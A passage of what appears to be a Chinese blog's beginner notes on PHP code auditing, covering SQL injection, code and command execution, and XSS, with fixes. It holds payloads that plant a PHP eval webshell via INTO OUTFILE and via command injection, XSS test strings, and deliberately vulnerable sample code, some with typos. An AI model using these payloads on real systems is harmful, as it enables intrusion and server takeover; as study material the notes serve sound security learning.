class="string">"GATEWAY_INTERFACE"</span>]  服务器使用的CGI规范的版本。</span><br><span class="line">$_SERVER[<span class="string">"SERVER_PROTOCOL"</span>]  请求页面时通信协议的名称和版本。</span><br><span class="line">$_SERVER[<span class="string">"REQUEST_METHOD"</span>]  请求提交数据的方式。</span><br><span class="line">$_SERVER[<span class="string">"QUERY_STRING"</span>]  服务器请求时？后面的参数。</span><br><span class="line">$_SERVER[<span class="string">"REQUEST_URI"</span>]  当前脚本路径，根目录之后的目录。</span><br><span class="line">$_SERVER[<span class="string">"SCRIPT_NAME"</span>]  当前脚本的路径。这在页面需要指向自己时非常有用。</span><br><span class="line">$_SERVER[<span class="string">"PHP_SELF"</span>]  当前正在执行脚本的文件名。</span><br><span class="line">$_SERVER[<span class="string">"REQUEST_TIME"</span>]  得到请求开始时的时间戳。</span><br><span class="line"></span><br><span class="line">var_dump($_SERVER)；</span><br></pre></td></tr></table></figure>

<p>$_FILES    文件上传</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$_FILES数组内容如下: </span><br><span class="line">$_FILES[<span class="string">'myFile'</span>][<span class="symbol">'name'</span>] 客户端文件的原名称。 </span><br><span class="line">$_FILES[<span class="string">'myFile'</span>][<span class="symbol">'type'</span>] 文件的 MIME 类型，需要浏览器提供该信息的支持，例如"image/gif"。 </span><br><span class="line">$_FILES[<span class="string">'myFile'</span>][<span class="symbol">'size'</span>] 已上传文件的大小，单位为字节。 </span><br><span class="line">$<span class="emphasis">_FILES['myFile']['tmp_</span>name'] 文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在php.ini的upload<span class="emphasis">_tmp_</span>dir 指定，但 用 putenv() 函数设置是不起作用的。 </span><br><span class="line">$_FILES[<span class="string">'myFile'</span>][<span class="symbol">'error'</span>] 和该文件上传相关的错误代码。['error'] 是在 PHP 4.2.0 版本中增加的。下面是它的说明：(它们在PHP3.0以后成了常量) </span><br><span class="line">UPLOAD<span class="emphasis">_ERR_</span>OK </span><br><span class="line">值：0; 没有错误发生，文件上传成功。 </span><br><span class="line">UPLOAD<span class="emphasis">_ERR_</span>INI_SIZE </span><br><span class="line">值：1; 上传的文件超过了 php.ini 中 upload<span class="emphasis">_max_</span>filesize 选项限制的值。 </span><br><span class="line">UPLOAD<span class="emphasis">_ERR_</span>FORM_SIZE </span><br><span class="line">值：2; 上传文件的大小超过了 HTML 表单中 MAX<span class="emphasis">_FILE_</span>SIZE 选项指定的值。 </span><br><span class="line">UPLOAD<span class="emphasis">_ERR_</span>PARTIAL </span><br><span class="line">值：3; 文件只有部分被上传。 </span><br><span class="line">UPLOAD<span class="emphasis">_ERR_</span>NO_FILE </span><br><span class="line">值：4; 没有文件被上传。 </span><br><span class="line">值：5; 上传文件大小为0. </span><br><span class="line"></span><br><span class="line">文件被上传结束后，默认地被存储在了临时目录中，这时您必须将它从临时目录中删除或移动到其它地方，如果没有，则会被删除。也就是不管是否上传成功，脚本执行完后临时目录里的文件肯定会被删除。所以在删除之前要用PHP的 copy() 函数将它复制到其它位置，此时，才算完成了上传文件过程。</span><br><span class="line">var<span class="emphasis">_dump($_</span>FILES)；</span><br></pre></td></tr></table></figure>

<p>表单：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span> =<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"upload.php"</span> <span class="attr">method</span> =<span class="string">"post"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> =<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">'file'</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> = <span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"点击提交"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>$_SESSTION 当前脚本可用SESTION变量的数组</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sesstion_start();</span><br><span class="line">$test = <span class="number">123</span>;</span><br><span class="line">$_SESSTION[<span class="string">'value'</span>]=$test;</span><br><span class="line"><span class="keyword">echo</span> $_SESSTION[<span class="string">'value'</span>];</span><br><span class="line">sesstion_destory();</span><br></pre></td></tr></table></figure>

<p>$_COOKIE 通过HTTP Cookies 方式传递给当前脚本的变量的数组    </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$cookie = $_COOKIE[<span class="number">0</span>][<span class="string">'usename'</span>] = <span class="string">"name"</span>;</span><br><span class="line">var_dump ($_COOKIE);</span><br></pre></td></tr></table></figure>

<p>COOKIE or SESSTION</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">两个都可以用来存私密的东西，同样也都有有效期的说法。</span><br><span class="line">区别在于。</span><br><span class="line">session是放在服务器上的，过期与否取决于服务期的设定，cookie是存在客户端的，过去与否可以在cookie生成的时候设置进去。</span><br><span class="line"><span class="number">1</span>、cookie数据存放在客户的浏览器上，</span><br><span class="line">session数据放在服务器上</span><br><span class="line"><span class="number">2</span>、cookie不是很安全，别人可以分析存放在本地的COOKIE并进行COOKIE欺骗</span><br><span class="line">考虑到安全应当使用session</span><br><span class="line"><span class="number">3</span>、session会在一定时间内保存在服务器上。当访问增多，会比较占用你服务器的性能</span><br><span class="line">考虑到减轻服务器性能方面，应当使用COOKIE</span><br><span class="line"><span class="number">4</span>、单个cookie在客户端的限制是<span class="number">3</span>K，就是说一个站点在客户端存放的COOKIE不能<span class="number">3</span>K。</span><br><span class="line"><span class="number">5</span>、<span class="number">300</span>个的限制我没听说</span><br><span class="line"><span class="number">6</span>、所以个人建议：</span><br><span class="line">将登陆信息等重要信息存放为SESSION</span><br><span class="line">其他信息如果需要保留，可以放在COOKIE中</span><br></pre></td></tr></table></figure>

<p>$_ENV    包含服务器端环境变量的数组、可在PHP程序的任何地方直接访问，只是被动的接受服务器端的环境变量转换为数组元素</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">环境变量（environment <span class="keyword">variables</span>）一般是指在操作系统中用来指定操作系统运行环境的一些参数，如：临时文件夹位置和系统文件夹位置等</span><br></pre></td></tr></table></figure>

<h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>mysql_query() 函数执行一条 MySQL 查询。</p>
<p><img src="/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563251980990.png" alt="1563251980990"></p>
<p>数字型注入    当输入的参数为整型，ID、年龄、页码，不需要单引号闭合</p>
<p>字符型注入    参数为字符串时，需要单引号闭合</p>
<p>查询数据</p>
<p>读写文件</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 UNION SELECT 1,2,3,<span class="php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>[$_POST[<span class="string">'a'</span>]];<span class="meta">?&gt;</span></span>(16进制) into outfile E:/Local/WWW/3.php'--+</span><br></pre></td></tr></table></figure>

<p>然后菜刀，127.0.0.1/3.php    a</p>
<p>执行命令</p>
<p>盲注</p>
<p>布尔盲注</p>
<p>时间盲注</p>
<p>报错盲注</p>
<p>HTTP头注入</p>
<p>修复方案：</p>
<p>使用预编译语句</p>
<p>使用存储过程</p>
<p>检查数据类型</p>
<p>使用安全函数</p>
<h3 id="宽字节注入、二次注入（扫描不出来）"><a href="#宽字节注入、二次注入（扫描不出来）" class="headerlink" title="宽字节注入、二次注入（扫描不出来）"></a>宽字节注入、二次注入（扫描不出来）</h3><p>addslashes()给‘加上\转义</p>
<p>逃逸单引号-&gt;加一个%df</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">%df</span>'===&gt;<span class="symbol">%df</span><span class="symbol">%27</span> ==&gt;(addslashes)===&gt;<span class="symbol">%df</span><span class="symbol">%5</span><span class="keyword">c</span><span class="symbol">%27</span>===&gt;(GBK)===&gt;運'</span><br></pre></td></tr></table></figure>

<p>修复方案，</p>
<p>使用mysql_set_charset(GBK)指定字符集</p>
<p>使用mysql_real_escape_string进行转义</p>
<p>二次注入：注入点因为经过过滤处理，无法触发SQL注入漏洞，比如addslashes函数，将单引号转义，但是存进数据库后又被还原，在这种情况下，如果发现一个新的注入同时应用了被插入的数据库数据，就可以实现闭合新发现的注入漏洞引发二次注入</p>
<p>先存进去，再查询，被转义的字符在存入数据库时转义消除，再查询，利用数据库中已经被存进去并且不存在转义的代码二次查询。</p>
<p>漏洞存在于先注册、留言板（写入脏数据）再查询、update（利用脏数据）系统</p>
<h3 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h3><p>eval 将字符串 转化成代码，</p>
<p>思路：用户能够控制函数的输入，存在可执行代码的危险函数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">常见危险函数：</span><br><span class="line">eval函数	<span class="keyword">assert</span>函数	</span><br><span class="line">动态函数执行</span><br><span class="line">preg_replace函数	</span><br><span class="line">回调函数</span><br><span class="line">写入文件+包含文件</span><br></pre></td></tr></table></figure>

<p>回调函数</p>
<p><img src="/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563259300240.png" alt="1563259300240"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">callBack</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $b = $_GET[<span class="string">'cmd'</span>];</span><br><span class="line">    <span class="keyword">eval</span>($b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">call_user_func(funtion: <span class="string">'callBack'</span>,$b);</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$b = <span class="string">"phpinfo()"</span>;</span><br><span class="line">call_user_func($_GET[<span class="string">'a'</span>],$b);	<span class="comment">//第一个参数用于回调，传入危险函数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt;&gt;a = <span class="keyword">eval</span> <span class="keyword">or</span> assert</span><br></pre></td></tr></table></figure>

<p>动态函数执行</p>
<p>1.定义一个函数</p>
<p>2.将函数名（字符串）赋值给一个变量</p>
<p>3.使用变量名代替函数名 动态调用函数    //php的函数可由字符串拼接</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$_GET[<span class="string">'A'</span>]($_GET[<span class="string">'B'</span>])；</span><br><span class="line"></span><br><span class="line">&gt;&gt;A=assert&amp;b=phpinfo();</span><br></pre></td></tr></table></figure>

<p>preg_match_all(/$str1/,$str2,$str3)        str1为标准    str2为待匹配    str3为用于存入匹配字符的数组</p>
<p>正则表达式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">正则表达语法规则</span><br><span class="line">限定符</span><br><span class="line">边界限制符</span><br><span class="line">后向引用</span><br><span class="line">普通字符作为原子	</span><br><span class="line">特殊符号作为原子	注意转义</span><br><span class="line">通用字符类型作为原子</span><br><span class="line">自定义原子表作为原子</span><br></pre></td></tr></table></figure>

<p>通用字符</p>
<p><img src="/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563260759584.png" alt="1563260759584"></p>
<p>自定义原子</p>
<p>$pattern1 = ‘/[aj]sp’    //匹配asp or jsp</p>
<p>限定符</p>
<p>‘/go=gle/‘            匹配前面（’o‘）出现的原子次数0次或1次或多次    </p>
<p>‘/go+gle/‘            匹配前面（’o‘）出现的原子次数1次或多次    </p>
<p>/go?gle/                匹配前面（’o‘）出现的原子次数0次或1次    </p>
<p>边界限定符</p>
<p>‘/^abc/‘            以abc开头</p>
<p>‘/abc$/‘            以abc结尾</p>
<p>‘/^abc$/‘            只匹配abc</p>
<p>反向引用</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'/<span class="tag">\<span class="name">d</span><span class="string">&#123;4&#125;</span></span>(-)<span class="tag">\<span class="name">d</span><span class="string">&#123;2&#125;</span></span><span class="tag">\<span class="name">\</span></span>1<span class="tag">\<span class="name">d</span><span class="string">&#123;2&#125;</span></span>/';		<span class="tag">\<span class="name">d</span></span>数字，&#123;4&#125;；4个；<span class="tag">\<span class="name">\</span></span>1，代表第一个括号的内容</span><br></pre></td></tr></table></figure>

<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">preg_replace</span>（$pattern,$replacement,<span class="keyword">subject）</span></span><br><span class="line"><span class="keyword">pattern </span>	正则匹配的内容	</span><br><span class="line"><span class="symbol">replacement</span>		用于替换的内容</span><br><span class="line"><span class="keyword">subject	</span>	要进行搜索和替换的内容</span><br></pre></td></tr></table></figure>

<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">第一个参数</span><br><span class="line">$cmd = $_GET[<span class="string">'cmd'</span>];</span><br><span class="line">$str = <span class="string">'&lt;php&gt;phpinfo()&lt;/php&gt;'</span>;</span><br><span class="line">preg_replace(<span class="string">"/&lt;php&gt;(.*?)$cmd"</span>,<span class="string">"\\1"</span>,$str1)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;</span>cmd = &lt;\/php&gt;<span class="regexp">/e			#	(.*?)-&gt;任意字符		/e</span>模式下执行replacement代码</span><br><span class="line"></span><br><span class="line">第二个参数</span><br><span class="line">preg_replace(<span class="string">"/php/e"</span>,$_GET[<span class="string">'cmd'</span>],’php‘);			<span class="comment">#执行cmd内容</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>cmd = cat /flag				<span class="comment">#大概是永远不会出现</span></span><br><span class="line"></span><br><span class="line">第三个参数</span><br><span class="line">$str = $_GET[<span class="string">'cmd'</span>];</span><br><span class="line">preg_replace(<span class="string">"/\[php\](.*?)\[\/php\]/e"</span>,\\<span class="number">1</span>,$str)</span><br><span class="line"></span><br><span class="line">思路：让cmd传过来的值与pattern相匹配，执行replacement</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;</span>[php]cat /flag[<span class="regexp">/php]</span></span><br></pre></td></tr></table></figure>

<p>修复方案：</p>
<p>尽量不要执行外部的应用程序或命令            #不用/e</p>
<p>使用自定义函数或函数库来替代外部应用程序或命令的功能</p>
<p>使用escappeshellarg函数来处理命令的函数        #用户出来的参数都是有害的</p>
<p>使用safe_mode_exec_dir来制定可执行的文件路径</p>
<p>将执行函数的参数做白名单限制，在代码或配置文件中限制某些参数    #禁止使用某些函数（源代码也不能使用）</p>
<h3 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h3><p>输入验证不足导致。其目标是通过易受攻击的应用程序在主机操作系统上执行任意命令</p>
<p>挖掘思路，</p>
<p>用户能够控制函数输入</p>
<p>存在可执行代码的危险函数</p>
<p>代码执行：执行的效果完全受限于语言本身</p>
<p>命令执行：不受限于语言与法本身，不受命令限制</p>
<p>命令执行的类型</p>
<p>代码层过滤不严</p>
<p>系统的漏洞造成命令注入</p>
<p>调用的第三方组件存在代码执行漏洞</p>
<p>常见的危险函数</p>
<p>string system(string $command[,int return_var])        </p>
<p>cmd = echo 111&gt;1.txt  </p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cmd</span><span class="bash"> = <span class="built_in">echo</span> &lt;?php @<span class="built_in">eval</span>[<span class="variable">$_POST</span>[<span class="string">'a'</span>]];?&gt;	&gt; 1.php	   [菜刀]</span></span><br></pre></td></tr></table></figure>

<p>passthru</p>
<p>//这两个函数有回显</p>
<p>学习windows 系统命令</p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">string</span> <span class="keyword">exec</span>（<span class="keyword">string</span> $command[,array $output[,<span class="keyword">int</span> $return_var]]）</span><br></pre></td></tr></table></figure>

<p>输出填充output数组</p>
<p>状态写入return_var变量</p>
<p>这个函数无回显，echo 也只回显一行</p>
<p>string shell_exec(string $cmd)</p>
<p>无回显，echo回显所有</p>
<p>cmd = dir &gt; 4.txt      将内容写入文件</p>
<p>反引号（`） 等于shell_exec()</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">'cmd'</span>];		&lt;&lt; cmd=ipconfig</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"&lt;pre&gt;"</span>;</span><br><span class="line"><span class="built_in">echo</span> shell_exec(<span class="variable">$cmd</span>);</span><br></pre></td></tr></table></figure>

<p>过滤函数</p>
<p>escapeshellcmd ( string <code>$command</code> ) : string        过滤整条命令</p>
<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">反斜线（<span class="symbol">\）</span>会在以下字符之前插入： &amp;#;`|*?~&lt;&gt;^()[]&#123;&#125;$<span class="symbol">\,</span> <span class="symbol">\x</span>0A 和 <span class="symbol">\x</span>FF。 ' 和 " 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 <span class="variable">% 和 ! 字符都会被空格代替</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cmd</span> = escapeshellcmd(<span class="variable">$_GET</span>[<span class="string">'cmd'</span>]);		&lt;&lt; cmd=<span class="built_in">echo</span> 5555 &gt; 5.txt   &gt;&gt;  5555   5.txt</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"&lt;pre&gt;"</span>;</span><br><span class="line"><span class="built_in">echo</span> shell_exec(<span class="variable">$cmd</span>);</span><br></pre></td></tr></table></figure>

<p>Escapeshellarg()    过滤参数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">对于单个单引号, escapeshellarg 函数转义后,还会在左右各加一个单引号,但 escapeshellcmd 函数是直接加一个转义符，对于成对的单引号, escapeshellcmd 函数默认不转义,但 escapeshellarg 函数转义:</span><br></pre></td></tr></table></figure>

<p>修复方案：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">尽量少用执行命令的函数，或者直接禁用，参数值尽量使用引号包括</span><br><span class="line"></span><br><span class="line">在使用动态函数之前，确保使用的函数式指定的函数之一	（白名单）</span><br><span class="line"></span><br><span class="line">在进入执行命令的函数，方法前，对参数进行过滤，对敏感字符进行转义</span><br><span class="line"></span><br><span class="line">对于可控点是程序参数的情况下，使用escapeshellcmd函数过滤；对于可控点是程序参数值得情况下，使用escapeshellarg函数进行过滤</span><br><span class="line"></span><br><span class="line">参数的值尽量使用引号包裹，并且在拼接前用addslashes进行转义</span><br></pre></td></tr></table></figure>

<h3 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a>XSS漏洞</h3><p>跨站脚本攻击，攻击者利用网站程序对用户输入过滤不足，输入可以显示在页面上对其他用户造成影响的HTML代码，从而盗取用户资料、利用用户身份惊醒某种动作或者对访问者进行病毒侵害的一种攻击方式</p>
<p>蠕虫、盗取cookie、跳转钓鱼网页、查看网页浏览信息</p>
<p>挖掘思路：没有过滤参数，传入到输出函数中</p>
<p>漏洞思路：搜索内容、发表文章、留言、评论回复、资料设置</p>
<p>漏洞类型：反射型；存储型；DOM型</p>
<p><img src="/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563282310170.png" alt="1563282310170"></p>
<p>常见场景：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//直接输出到浏览器页面	</span></span><br><span class="line">    $content = $_GET[<span class="string">'content'</span>];</span><br><span class="line">	<span class="keyword">echo</span> $content;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment">//直接输出到HTML标签</span></span><br><span class="line">&lt;input type = <span class="string">'text'</span> value=<span class="string">"&lt;?php echo $content?&gt;"</span>&gt;</span><br><span class="line">    <span class="comment">//直接输出到&lt;script&gt;标签</span></span><br><span class="line"> 	$content = $_GET[<span class="string">'content'</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">var</span> xss = <span class="string">'&lt;?phpe cho $content ?&gt;'</span>;</span><br><span class="line">	document.write(xss);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">将前端获取的内容，直接输出到浏览器页面		?content=123<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">HTML标签		先闭合标签	?content=123"&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>标签		先闭合单引号、再闭合标签		?content=123';<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563283530673.png" alt="1563283530673">（感觉有点像二次注入，被搜索时触发，管理员刷新留言板时）</p>
<p>（XSS平台）</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$xss = $_POST[<span class="string">'xss'</span>];</span><br><span class="line">$connection = mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);</span><br><span class="line">mysql_select_db(<span class="string">'xss'</span>,$connection);</span><br><span class="line"><span class="keyword">if</span> ($xss !==<span class="keyword">null</span>)&#123;</span><br><span class="line">    $sql = <span class="string">"INSET INTO xss(id.payload) VALUES('1','$xss');"</span>;</span><br><span class="line">    $result = mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"fail"</span>.mysql_error());</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;form action=<span class="string">""</span> method =<span class="string">"post"</span>&gt;</span><br><span class="line">    &lt;input type =<span class="string">"text"</span> name=<span class="string">"xss"</span>&gt;</span><br><span class="line">    &lt;input type = <span class="string">"submit"</span> value=<span class="string">"submit"</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$connect = mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);</span><br><span class="line">mysql_select_db(<span class="string">'xss'</span>,$connection);</span><br><span class="line">$sql = <span class="string">"select payload from xss where id = 1"</span>;</span><br><span class="line">$result = mysql_query($sql);</span><br><span class="line"><span class="keyword">while</span>($row = mysql_fetch_array($result))&#123;</span><br><span class="line">    <span class="keyword">echo</span> $row[<span class="string">'payload'</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;	<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/XSS/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563284488840.png" alt="1563284488840"></p>
